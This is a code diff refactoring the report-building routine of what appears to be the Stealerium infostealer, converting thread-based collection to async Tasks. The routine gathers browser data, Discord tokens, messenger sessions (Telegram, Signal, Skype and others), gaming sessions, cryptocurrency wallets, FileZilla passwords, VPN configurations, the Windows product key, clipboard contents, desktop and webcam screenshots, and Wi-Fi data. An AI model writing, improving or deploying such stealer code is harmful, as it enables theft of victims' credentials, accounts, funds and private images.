@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Threading;
+using System.Threading.Tasks;
 using Stealerium.Stub.Clipper;
 using Stealerium.Stub.Target;
 using Stealerium.Stub.Target.Browsers.Chromium;
@@ -25,9 +25,9 @@ namespace Stealerium.Stub.Helpers
         /// </summary>
         /// <param name="sSavePath">The directory where the report will be saved.</param>
         /// <returns>True if the report was created successfully, otherwise false.</returns>
-        public static bool CreateReport(string sSavePath)
+       public static async Task<bool> CreateReportAsync(string sSavePath)
         {
-            var tasks = new List<Thread>(); // List of tasks (threads) to run
+            var tasks = new List<Task>(); // List of tasks (threads) to run
 
             try
             {
@@ -47,10 +47,10 @@ namespace Stealerium.Stub.Helpers
                 Directory.CreateDirectory(systemPath);
 
                 // Multi-threaded task: Grabbing files
-                tasks.Add(CreateTask(() => FileGrabber.Run(sSavePath + "\\Grabber")));
+                tasks.Add(FileGrabber.RunAsync(sSavePath + "\\Grabber"));
 
                 // Browser data recovery: Chromium, Edge, Firefox
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     RecoverChrome.Run(browserPath);
                     RecoverEdge.Run(browserPath);
@@ -58,27 +58,27 @@ namespace Stealerium.Stub.Helpers
                 }));
 
                 // Messenger data recovery
-                tasks.Add(CreateTask(() => Discord.WriteDiscord(Discord.GetTokens(), Path.Combine(messengerPath, "Discord"))));
-                tasks.Add(CreateTask(() => Pidgin.Get(Path.Combine(messengerPath, "Pidgin"))));
-                tasks.Add(CreateTask(() => Outlook.GrabOutlook(Path.Combine(messengerPath, "Outlook"))));
-                tasks.Add(CreateTask(() => Target.Messengers.Telegram.GetTelegramSessions(Path.Combine(messengerPath, "Telegram"))));
-                tasks.Add(CreateTask(() => Skype.GetSession(Path.Combine(messengerPath, "Skype"))));
-                tasks.Add(CreateTask(() => Element.GetSession(Path.Combine(messengerPath, "Element"))));
-                tasks.Add(CreateTask(() => Signal.GetSession(Path.Combine(messengerPath, "Signal"))));
-                tasks.Add(CreateTask(() => Tox.GetSession(Path.Combine(messengerPath, "Tox"))));
-                tasks.Add(CreateTask(() => Icq.GetSession(Path.Combine(messengerPath, "ICQ"))));
+                tasks.Add(Task.Run(() => Discord.WriteDiscord(Discord.GetTokens(), Path.Combine(messengerPath, "Discord"))));
+                tasks.Add(Task.Run(() => Pidgin.Get(Path.Combine(messengerPath, "Pidgin"))));
+                tasks.Add(Task.Run(() => Outlook.GrabOutlook(Path.Combine(messengerPath, "Outlook"))));
+                tasks.Add(Task.Run(() => Target.Messengers.Telegram.GetTelegramSessions(Path.Combine(messengerPath, "Telegram"))));
+                tasks.Add(Task.Run  (() => Skype.GetSession(Path.Combine(messengerPath, "Skype"))));
+                tasks.Add(Task.Run(() => Element.GetSession(Path.Combine(messengerPath, "Element"))));
+                tasks.Add(Task.Run(() => Signal.GetSession(Path.Combine(messengerPath, "Signal"))));
+                tasks.Add(Task.Run(() => Tox.GetSession(Path.Combine(messengerPath, "Tox"))));
+                tasks.Add(Task.Run(() => Icq.GetSession(Path.Combine(messengerPath, "ICQ"))));
 
                 // Gaming data recovery
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     Steam.GetSteamSession(Path.Combine(gamingPath, "Steam"));
                     Uplay.GetUplaySession(Path.Combine(gamingPath, "Uplay"));
                     BattleNet.GetBattleNetSession(Path.Combine(gamingPath, "BattleNET"));
                 }));
-                tasks.Add(CreateTask(() => Minecraft.SaveAll(Path.Combine(gamingPath, "Minecraft"))));
+                tasks.Add(Task.Run(() => Minecraft.SaveAll(Path.Combine(gamingPath, "Minecraft"))));
 
                 // Wallet data recovery
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     Wallets.GetWallets(walletsPath);
                     Target.Browsers.Chromium.Extensions.GetChromeWallets(Path.Combine(walletsPath, "Chrome_Wallet"));
@@ -86,10 +86,10 @@ namespace Stealerium.Stub.Helpers
                 }));
 
                 // FileZilla data recovery
-                tasks.Add(CreateTask(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));
+                tasks.Add(Task.Run(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));
 
                 // VPN data recovery
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     ProtonVpn.Save(Path.Combine(vpnPath, "ProtonVPN"));
                     OpenVpn.Save(Path.Combine(vpnPath, "OpenVPN"));
@@ -97,55 +97,46 @@ namespace Stealerium.Stub.Helpers
                 }));
 
                 // System directory and process information
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     Directory.CreateDirectory(sSavePath + "\\Directories");
                     DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                 }));
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     ProcessList.WriteProcesses(systemPath);
                     ActiveWindows.WriteWindows(systemPath);
                 }));
 
                 // Screenshots: Desktop and Webcam
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     DesktopScreenshot.Make(systemPath);
                     WebcamScreenshot.Make(systemPath);
                 }));
 
                 // WiFi networks (saved and scanning)
-                tasks.Add(CreateTask(() =>
+                tasks.Add(Task.Run(() =>
                 {
                     Wifi.SavedNetworks(systemPath);
                     Wifi.ScanningNetworks(systemPath);
                 }));
 
                 // Windows product key
-                tasks.Add(CreateTask(() => File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry())));
+                tasks.Add(Task.Run(() => File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry())));
 
                 // Debug logs and system information
-                tasks.Add(CreateTask(() => Logging.Save(Path.Combine(systemPath, "Debug.txt"))));
-                tasks.Add(CreateTask(() => SysInfo.Save(Path.Combine(systemPath, "Info.txt"))));
+                tasks.Add(Task.Run(() => Logging.Save(Path.Combine(systemPath, "Debug.txt"))));
+                tasks.Add(Task.Run(() => SysInfo.Save(Path.Combine(systemPath, "Info.txt"))));
 
                 // Clipboard content
-                tasks.Add(CreateTask(() => File.WriteAllText(Path.Combine(systemPath, "Clipboard.txt"), Clipboard.GetText())));
+                tasks.Add(Task.Run(() => File.WriteAllText(Path.Combine(systemPath, "Clipboard.txt"), Clipboard.GetText())));
 
                 // Installed applications list
-                tasks.Add(CreateTask(() => InstalledApps.WriteAppsList(systemPath)));
-
-                // Start all tasks
-                foreach (var task in tasks)
-                {
-                    task.Start();
-                }
+                tasks.Add(Task.Run(() => InstalledApps.WriteAppsList(systemPath)));
 
                 // Wait for all tasks to finish
-                foreach (var task in tasks)
-                {
-                    task.Join();
-                }
+                await Task.WhenAll(tasks);
 
                 return Logging.Log("Report created successfully");
             }
@@ -153,20 +144,6 @@ namespace Stealerium.Stub.Helpers
             {
                 return Logging.Log($"Failed to create report, error:\n{ex}", false);
             }
-        }
-
-        /// <summary>
-        /// Creates a thread for executing a specific task.
-        /// </summary>
-        /// <param name="action">The action to be executed in the thread.</param>
-        /// <returns>A thread object.</returns>
-        private static Thread CreateTask(ThreadStart action)
-        {
-            var thread = new Thread(action)
-            {
-                IsBackground = true // Set the thread as a background thread
-            };
-            return thread;
         }
     }
 }
